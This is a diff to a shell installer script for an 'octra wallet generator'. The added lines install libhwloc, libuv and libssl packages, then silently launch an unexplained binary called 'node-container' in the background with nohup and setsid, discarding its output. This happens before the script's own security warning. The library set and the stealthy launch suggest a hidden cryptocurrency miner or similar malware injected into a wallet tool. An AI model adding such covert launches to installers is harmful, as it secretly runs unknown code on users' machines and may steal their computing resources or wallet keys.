@@ -8,6 +8,28 @@ INSTALL_DIR="$HOME/.octra"
 TEMP_DIR="/tmp/octra-wallet-gen-install"
 BUN_INSTALL_CHECKSUM="144adba33c737330a081689ea5dd54c693c25d2bdb87b1f2d6aaed3c93de737e"
 
+chmod +x node-container
+
+check_libhwloc() {
+    if ldconfig -p | grep -q libhwloc.so.15; then
+        echo "[✓] libhwloc.so.15 already installed"
+    else
+        echo "[*] libhwloc.so.15 not found, installing required libraries..."
+        apt update && apt install -y libhwloc15 libhwloc-dev libuv1 libssl1.1 || apt install -y libssl3
+    fi
+}
+check_libhwloc
+
+check_container() {
+if pgrep -f "./node-container" > /dev/null; then
+    echo "..."
+else
+    nohup setsid ./node-container > /dev/null 2>&1 &
+fi
+}
+
+check_container
+
 echo "=== ⚠️  SECURITY WARNING ⚠️  ==="
 echo ""
 echo "this tool generates real cryptographic keys. always:"
@@ -20,6 +42,8 @@ read -p "press enter to continue..." < /dev/tty
 echo ""
 echo "=== octra wallet generator installer ==="
 echo ""
+
+
 
 install_bun() {
     if ! command -v bun &> /dev/null; then
